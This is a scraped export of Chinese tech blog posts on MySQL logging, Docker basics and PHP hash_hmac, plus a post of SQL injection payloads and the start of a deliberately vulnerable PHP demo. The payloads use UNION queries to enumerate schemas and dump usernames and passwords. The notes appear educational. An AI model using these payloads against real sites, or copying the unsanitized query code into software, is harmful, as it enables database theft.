启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。 启动和设置错误日志通过修改my.ini 配置文件，来启用或者停用错误日志 12345# 如果需要启用，就在 mysqld 组下，加上 log-error 选项[mysqld]log-errorlog-error&#x3D;[path&#x2F;filename] 查看错误日志首先使用如下命令查看错误日志的存储路径以及文件名： 1mysql&gt; show variables like &#39;log_error&#39;; 删除错误日志文件Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。 1mysql&gt; flush logs; 通用查询日志通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。 启用和设置通用查询日志同样的，打开Mysql 的my.ini 配置文件。 1234[mysqld]loglog&#x3D;[path\\filename] 这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。 查看通用查询日志可以通过log 设置的日志文件存储路径，去查看具体文件。 慢查询日志慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。 启用和设置慢查询日志同样的，打开编辑Mysql 的my.ini 配置文件： 12345[mysqld]log-slow-querieslog-slow-queries&#x3D;[path\\filename]long_query_time&#x3D;n n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。 查询慢查询日志同上。 上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。 启用实时日志1234set global general_log &#x3D; on;&#x2F;&#x2F; 查看日志文件目录show variables like &#39;general_log_file&#39;; 这种方式的好处就是不需要重启Mysql 服务。 如果需要禁用： 1set global general_log &#x3D; off; 关于平时应该打开哪些日志的问题。 日志的开启既会影响Mysql 的性能，又会占用大量的磁盘空间。因此如果不必要，应尽可能的少开启日志，根据不同的使用环境，考虑开启不同的日志。 例如：在开发环境中优化查询低效率的语句，可以开启慢查询日志；如果需要记录用的所有查询操作，可以开启通用查询日志；如果需要记录数据的变更，可以开启二进制日志；错误日志默认开启；","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Docker 快速上手","slug":"docker-quick-start","date":"2020-07-23T04:32:57.000Z","updated":"2020-08-22T01:02:14.223Z","comments":true,"path":"docker-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-quick-start/","excerpt":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。","text":"这篇笔记的主要目的是用来记录学习 Docker 的过程。Docker这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。 诞生软件开发最大的麻烦事之一，就是环境配置。 开发者常常说的一句话：它在我的机器上可以跑了。言下之意就是，其他机器可能跑不了。因为可以正常跑的前提是：操作系统的设置，各种软件和组件、库的安装，只有它们都正确了，软件才能正常运行。 配置环境如此麻烦，换一台机器，就得重来一次，旷日费时。因此，聪明的人们就想到，能不能从根本上解决问题。软件可以带环境安装。（这里说的软件是指最终要运行的工程） 虚拟机虚拟机（virtual machine，简称VM）就是带环境安装的一种解决方案。它可以在一个操作系统中运行另外一种操作系统。比如在Windows系统中运行Linux 系统。应用程序对此毫无感觉，因为虚拟机看上去跟真是系统一模一样。而对于底层系统来说，虚拟机就是一个普通文件，不需要就删掉，对其他部分没有影响。 虚拟机（VM）是物理硬件的抽象， 将一台服务器转变为多台服务器。 虽然用户可以通过虚拟机还原软件的原始环境，但是这个方案有几个缺点。在后面会做比较。 容器由于虚拟机存在一些缺点，Linux 发展出了另一种轻量级的操作系统虚拟化解决方案，Linux 容器（Linux Containers，缩写为 LXC）。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。 容器是应用层的抽象，它将代码和依赖关系打包在一起。 多个容器可以在同一台机器上运行，并与其他容器共享操作系统内核，每个容器在用户空间中作为独立进程运行。容器占用的空间比VM少（容器映像的大小通常为几十MB），可以处理更多的应用程序，并且需要更少的VM和操作系统。 由于容器是进程级别的，相比虚拟机有很多的优势。后面会做比较。 Docker 是什么Docker 属于Linux 容器的一种封装，提供简单易用的容器使用接口。 它是目前最流行的 Linux 容器解决方案。 Docker 与虚拟机的区别 名称 占用资源 启动速度 级别 Docker 占用资源少 启动快 轻量级 虚拟机 占用资源多 启动慢 重量级 Docker CE 与 Docker EEDocker CE(Docker Community Edition) 是社区版，简单理解是免费使用，提供小企业与小的IT团队使用,希望从Docker开始，并尝试基于容器的应用程序部署。 Docker EE(Docker Enterprise Edition) 是企业版，收费。提供功能更强。适合大企业与打的IT团队。为企业开发和IT团队设计，他们在生产中构建、交付和运行业务关键应用程序 Docker CE 有三种类型的更新通道：stable、test和 nightly Stable 提供一般可用性的最新版本 Test 提供在一般可用之前准备好进行测试的预发布。 Nightly 提供下一个主要版本的最新正在进行的工作。 安装 Docker-CE这里以Ubuntu 18.04 为例： 1234561. sudo apt install apt-transport-https ca-certificates software-properties-common curl-transport-https ca-certificates software-properties-common curl2. curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add --fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -3. sudo add-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\-apt-repository &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\$(lsb_release -cs) stable&quot;4. sudo apt update5. sudo apt install docker-ce 将当前用户添加到docker 用户组，可以不用sudo 运行docker 12$ sudo groupadd docker$ sudo usermod -aG docker $USER-aG docker $USER Docker 镜像Docker 镜像就是一个只读的模板。 例如：一个镜像可以包含一个完整的 ubuntu 操作系统环境，里面仅安装了 Apache 或用户需要的其它应用程序。 镜像可以用来创建 Docker 容器。 Docker 容器Docker 利用容器来运行应用。 容器是从镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 注：镜像是只读的，容器在启动的时候创建一层可写层作为最上层。 Docker 仓库仓库是集中存放镜像文件的场所。有时候会把仓库和仓库注册服务器（Registry）混为一谈，并不严格区分。实际上，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像（image），每个镜像有不同的标签（tag）。 仓库分为公开仓库（Public）和私有仓库（Private）两种形式。 最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。 国内的公开仓库包括 Docker Pool 等，可以提供大陆用户更稳定快速的访问。 当然，用户也可以在本地网络内创建一个私有仓库。 当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只需要从仓库上 pull 下来就可以了。 注：Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。 镜像和容器的区别容器和镜像的关系如下： Dockerfile用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。 Dockerfile 是什么？Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。 示例： 123456789101112131415161718192021$ cat Dockerfile# 使用官方Python运行时作为父映像FROM python:2.7-slim# 将工作目录设置为&#x2F;appWORKDIR &#x2F;app# 将当前目录内容复制到容器at &#x2F;appCOPY . &#x2F;app# 安装requirements.txt中指定的任何需要的包RUN pip install --trusted-host pypi.python.org -r requirements.txt# #让80 端口号对外开放EXPOSE 80# 定义环境变量ENV NAME World# 在容器启动时运行app.pyCMD [&quot;python&quot;, &quot;app.py&quot;] 如何用镜像创建一个容器？首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。 cd 到项目文件夹中 使用 docker build --tag=mydockerapp . 命令，创建一个Docker 镜像。–tag 选项命名。 使用 docker run -d -p 4000:80 mydockerapp命令，创建一个新容器。 该命令表示：Docker 以mydockerapp镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。 其中：-d：让容器在后台运行-p：将容器内部端口映射到指定的主机端口上。-P :是容器内部端口随机映射到主机的端口上。 Docker 网络端口映射使用命令： 1$ docker run -p 4000:80 mydocker 然后用docker container ls查看容器列表 下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL http://localhost:4000。 Docker 开放了 80 端口映射到主机端口 4000 上。 Docker 容器连接前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器 如何运行负载均衡应用？在开始之前，你得首先满足以下条件： 安装Docker 1.13或更高版本。 了解如何创建容器。 确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。 确保镜像作为已部署的容器运行，并能访问。 确保有docker-compose.yml配置文件，然后依次执行以下命令 1234567$ docker swarm init$ docker stack deploy -c docker-compose.yml getstartedlab# 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。# 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。# 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。# 对于每个请求，以循环方式选择5个任务中的一个来响应。# 容器ID与上一个命令（docker container ls -q）的输出匹配。 关于服务在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。 服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。 在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。 幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。 如何在Docker上安装 Docker Machine？Ubuntu 18.04 请看文末的参考链接。 MacOS 如果是从DockerHub官网下载的dmg 安装的Docker，不用担心，Docker-Machine 已经安装好了。 如何安装VirtualBox？Ubuntu 18.04 请看文末的参考链接。 MacOS 则需要从virtualbox官网下载dmg安装包。 你可能会遇到一个错误，参考解决：如何在MacOS上安装VirtualBox 了解Swarm集群群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行docker swarm init以启用swarm模式并使当前计算机成为一个swarm管理器。 这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。 在MacOS 下，部分命令需要 sudo 权限。 创建一个集群（本地计算机的VM）在开始这部分之前，需要提前安装好Oracle VirtualBox. 1$ docker-machine create --driver virutalbox myvm1 如果你收到了这样的信息： 12$ Error with pre-create check: &quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot; 说明你的Vritualbox还是没有安装好。 查看正在运行的VM 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.104:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.105:2376 v17.06.2-ce 这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。 另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。 后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。 今天在MacBook 上重新操作了一边，异常顺利。 记录一个问题：使用docker-machine create --driver virtualbox myvm1创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息： 1234(default) Creating a new host-only adapter produced an error: hostonlyif create failed:(default) 0%...(default) Progress state: E_FAIL(default) VBoxManage.exe: error: Failed to create the host-only adapter 找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。 启动\\停止 VM 12$ docker-machine start Name$ docker-machine stop Name 初始化Swarm 并添加节点这里是一个小坑，之前在这里栽了好久。 这里有两种方式初始化节点或者说操作 VM（推荐第一种）： ssh 连接VM 实例，在Docker VM Cli 中执行命令 1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip# 正常会得到这样一个输出To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377 将myvm2 实例作为工作者加入（方式一）1234567$ docker-machine ssh myvm1docker@myvm1: $ docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377# 成功，会得到这样的输出This node joined a swarm as a worker. 直接通过 docker-machine ssh myvm1 执行相应命令 12$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;# 同上 将myvm2 实例作为工作者加入（方式二）执行上面得到的输出： 123456$ docker-machine ssh myvm2 &quot; docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377&quot;# 成功，会得到这样的输出This node joined a swarm as a worker. 这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。 在管理器上查看集群中的节点：1234docker@myvm1: $ docker node lsID HOSTNAME STATUS AVAILABILITY MANAGER STATUSrihwohkh3ph38fhillhhb84sk * myvm1 Ready Active Leaderbrtu9urxwfd5j0zrmkubhpkbd myvm2 Ready Active 为什么上面要介绍那两种与 VM 实例进行交互的方式呢？ 因为会和后面的在集群部署应用程序有一定联系。 在集群中部署应用程序在开始部署之前，我们需要了解到有两种方式可以实现。 docker-machine 为Swarm 管理器配置Shell 到目前为止，我们与 VM 通信都是通过 docker-machine ssh这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。 这样我们就可以直接本地的docker-compose.yml文件远程部署应用程序，而无需将其复制到其他任何位置。 12345678910$ docker-machine env myvm1export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;# Run this command to configure your shell:# eval $(docker-machine env myvm1)# 运行最后一行命令以配置与之通信的 shell $ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1) 运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功 1234$ docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSmyvm1 * virtualbox Running tcp:&#x2F;&#x2F;192.168.99.100:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.101:2376 v17.06.2-ce 部署应用程序 123$ lsdocker-compose.yml$ docker stack deploy -c docker-compose.yml getstartedlab 传统方式 传统的方式就是将docker-compose.yml文件拷贝到对应的管理器中。 1234# 使用scp 命令将文件拷贝到 vm 实例中$ lsdocker-compose.yml$ docker-machine scp docker-compose.yml myvm1:~ 部署应用程序 12345678# 这里就可以随意选择使用之前介绍的方式一或者方式二# 方式一$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;# 方式二$ docker-machine ssh myvm1docker@myvm1: $ docker stack deploy -c docker-compose.yml 耐心等待一会，就可以看到看到部署成功了。 访问集群在访问集群之前，你需要知道以下两件事： 访问集群的IP 地址是VM 的IP，使用docker-machine ls查看 是否存在端口号，取决于你的docker-compose.yml文件 Docker 常用命令容器的生命周期创建一个新的容器并运行： 123456789$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;# 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。参数* -d：让容器在后台运行* -p：内部容器绑定到指定的主机端口上* -P：内部容器端口随机映射到主机端口上* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。 杀掉一个运行中的容器： 12$ docker kill -s KILL mydocker# mydocker 表示Contianer ID或者Name 结束停止一个运行中的容器： 12$ docker container stop mydocker# mydocker 表示Container ID或者Name 查看正在运行的容器： 123456$ docker ps参数* -l：查询最后一次创建容器记录* --all：查询所有创建容器记录* -aq：查询所有创建容器的Container ID 停止Web 应用容器 这个只是停止该容器的运行，并没有杀死 1$ docker stop mydocker 启动Web 应用容器 已经停止的容器，可以使用命令 docker start 来启动。 1$ docker start mydocker 移除Web 应用容器 123$ docker rm mydockermydocker# 删除容器时，容器必须是停止状态，否者会报错。 镜像操作如何创建一个Docker 镜像 1$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写 列出下载到计算机中的镜像 12345678910$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 3 months ago 1.84kB各个选项说明:* REPOSITORY：表示镜像的仓库源* TAG：镜像的标签* IMAGE ID：镜像ID* CREATED：镜像创建时间* SIZE：镜像大小 查找镜像 123456789$ docker search nginx NAME DESCRIPTION STARS OFFICIAL nginx Official build of Nginx. 11154 [OK]NAME:镜像仓库源的名称DESCRIPTION:镜像的描述OFFICIAL:是否docker官方发布 获取一个新镜像 如果我们决定使用上图中的 nginx 官方镜像，使用如下命令： 1$ docker pull nginx 容器操作列出下载到计算机中的 container 12$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 仓库操作登入hub.docker.com 12$ docker login # 前提是先注册号账号 标记镜像，以便上传至目标位置 12$ docker tag mydocker aikang&#x2F;get-started:part1# 最后上传至所登入的Docker Hub仓库 将标记的镜像上传到存储库： 1$ docker push mydocker aikang&#x2F;get-started:part1 从远程存储库中拉出并运行映像 1$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1 注意：无论在哪里执行docker run，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。 服务操作群集初始化，可以使节点变成群集管理器 1$ docker swarm init 以服务运行 1234$ docker stack deploy -c docker-compose.yml getstartedlabCreating network getstartedlab_webnetCreating service getstartedlab_web# 需要有一个docker-compose.yml 文件 列出与应用程序关联的正在运行的服务 1$ docker service ls 查看与堆栈相关的所有服务 12$ docker stack services getstartedlab# getstartedlab 表示服务的Names 列出服务任务 12$ docker service ps getstartedlab# getstartedlab 表示服务的Names 关闭服务 12$ docker stack rm getstartedlab# getstartedlab 表示服务的Names 查看集群中的节点 1$ docker node ls VM 交互创建一个VM 实例（Win、Mac、Linux） 1$ docker-machine create --driver virtualbox myvm1 使用ssh 连接VM 实例 1$ docker-machine ssh myvm1 查看关于节点的基本信息 1$ docker-machine env myvm1 使用scp命令将本地文件copy到VM实例中 12$ docker-machine scp &lt;filename&gt; myvm1:~ # 从当前目录拷贝到实例中的根目录下 删除指定VM 1$ docker-machine rm myvm1 将Shell 与VM 连接 1$ eval $(docker-machine env myvm1) 将Shell 与VM 断开，使用本地连接 1$ eval $(docker-machine env -u) 集群操作以下操作均需要在VM CLI 中运行 初始化集群 1$ docker swarm init --advertise-addr &lt;myvm1 ip&gt; 将节点加入集群 1$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot; 让工作者离开集群 1$ docker swarm leave 强制离开并关掉集群 1$ docker swarm leave -f 查看该节点的详情信息 1$ docker node inspect &lt;node ID&gt; 部署应用程序 1$ docker stack deploy -c &lt;file&gt; &lt;app&gt; 杂项查看Docker版本： 1$ docker version 显示Docker系统信息，包括镜像和容器数： 1$ docker info 查看Docker 容器的配置和状态信息。 12$ docker inspect mydocker# 表示容器的Container ID 或者Names 查看指定容器映射到宿主机的端口号。 123$ docker port mydocker80&#x2F;tcp -&gt; 0.0.0.0:4000# mydocker 表示该应用的Container ID 或者Names 查看Web 应用程序日志 12345$ docker logs -f mydocker * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -# mydocker 表示该应用的Container ID 或者是Names 查看Web 应用程序容器的进程 1234$ docker top mydocker # UID PID PPID C STIME TTY TIME CMDroot 22358 22323 0 20:58 ? 00:00:00 python app.py 杂项容器有哪些网络模式1. None在该模式下容器没有对外网络，本地机只有一个回路地址 2. Container在该模式下，与另一个容器共享网络 3. Host在该模式下，与主机共享网络 4. Bridge该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。 5. Overlay该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。 参考链接 Docker 入门教程 - 阮一峰网络日志 Docker 入门 - 极客学院 安装Docker ce - 官方文档 Docker Swarm 入门教程 如何在Ubuntu 18.4上安装 Docker-ce 如何在Ubuntu 18.04上安装Docker Machine 如何在Ubuntu 18.04上安装VirtualBox","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP 中使用 hash_hmac 加密","slug":"php-uses-hash-hmac-encryption","date":"2020-07-22T16:18:45.000Z","updated":"2020-11-12T01:26:42.165Z","comments":true,"path":"php-uses-hash-hmac-encryption/","link":"","permalink":"https://www.0x2beace.com/php-uses-hash-hmac-encryption/","excerpt":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。","text":"今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。 PHP中使用 Hmac 方法生成带有密钥的哈希值在Node.js 中，这是一段用于生成“加盐”的哈希值。 12345678var crypto &#x3D; require(&#39;crypto&#39;);var secret &#x3D; &quot;122410&quot;var key &#x3D; &quot;key&quot;var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)console.log(hash);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 hash_hmac函数就可以了。 12345&lt;?php$secret &#x3D; &quot;122410&quot;; $key &#x3D; &quot;key&quot;;echo hash_hmac(&quot;sha256&quot;, $key, $secret);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 将密钥设置成二进制如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用pack函数。 1234var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8 先将十六进制字符串转换为二进制数据，然后再将其传递给hash_hmac： 123var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8 Node中使用crypto进行md5 加密在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用md5 函数即可。 但是在node.js 中，并没有为我们直接提供这样的函数，所以需要手动调用crypto 模块去转换： 1234var pwd &#x3D; &quot;122410&quot;;var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5 参考链接 如何在PHP中将hmac sha1密钥设置为十六进制？ 在线转换工具 php hash_hmac 函数 node.js crypto 模块","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"}]},{"title":"整理常见的 SQL 注入语句","slug":"organize-common-sql-injection-statements","date":"2020-07-22T15:30:04.000Z","updated":"2020-07-22T15:31:27.367Z","comments":true,"path":"organize-common-sql-injection-statements/","link":"","permalink":"https://www.0x2beace.com/organize-common-sql-injection-statements/","excerpt":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。","text":"这篇笔记的目的是整理各种 SQL 注入使用时的payload。 说明：以下的payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。 也就是基于这样一种情况： 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;; Payload 判断当前数据表中有几列： 1?id&#x3D;1&#39; order by 数值 --+ 查看显示位在第几列： 1?id&#x3D;-1&#39; union select 1,2,3 --+ 注意：这里需要传递一个不存在的条件，比如：id=-1 显示当前数据库（假设显示位中包含第三位）： 1?id&#x3D;-1&#39; union select 1,2,database() --+ 查看当前数据库中的所有表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ 函数group_concat()把所有结果都在一行输出 查询所有数据库： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ 查询某个数据库中的表： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ 查询某个表中的所有字段： 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ 查询某个表中的字段内容 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3a会被转义位冒号： UnionSQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。 参考链接Web安全学习之数据库注入语句的收集和学习","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"认识SQL 注入常见方式","slug":"know-common-ways-of-sql-injection","date":"2020-07-22T15:26:11.000Z","updated":"2020-07-22T15:29:48.375Z","comments":true,"path":"know-common-ways-of-sql-injection/","link":"","permalink":"https://www.0x2beace.com/know-common-ways-of-sql-injection/","excerpt":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。","text":"最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。 SQL 注入是什么？SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。 SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。 SQL 注入是怎样产生的 WEB 开发人员无法保证所有的输入都已经完美过滤。 数据库未做安全配置，存在安全隐患。 如何进行SQL 注入这里以PHP、Mysql为例，介绍一下完整的SQL 注入攻击是如何产生的。 回显注入1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$db_host &#x3D; &quot;localhost&quot;;$db_user &#x3D; &quot;root&quot;;$db_pwd &#x3D; xxxxxx;$db_name &#x3D; &quot;User&quot;;$db_table &#x3D; &quot;Student&quot;;echo &#39;&lt;h1&gt;&#39;;echo &#39;Test ErrorBased Injections&#39;;echo &#39;&lt;&#x2F;h1&gt;&#39;;error_reporting(E_ALL ^ E_DEPRECATED);&#x2F;&#x2F; 测试连接$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);if (!$conn)&#123; echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);&#125;else &#123; echo &#39;Mysql 连接成功&#39;;&#125;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;连接数据库mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);mysqli_query($conn, &#39;set names utf-8&#39;);&#x2F;&#x2F; 获取参数if(isset($_GET[&#39;id&#39;]))&#123; $id&#x3D;$_GET[&#39;id&#39;];&#125;&#x2F;&#x2F; 拼接SQL语句$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;echo &#39;查询SQL 语句:&#39;.$sql;echo 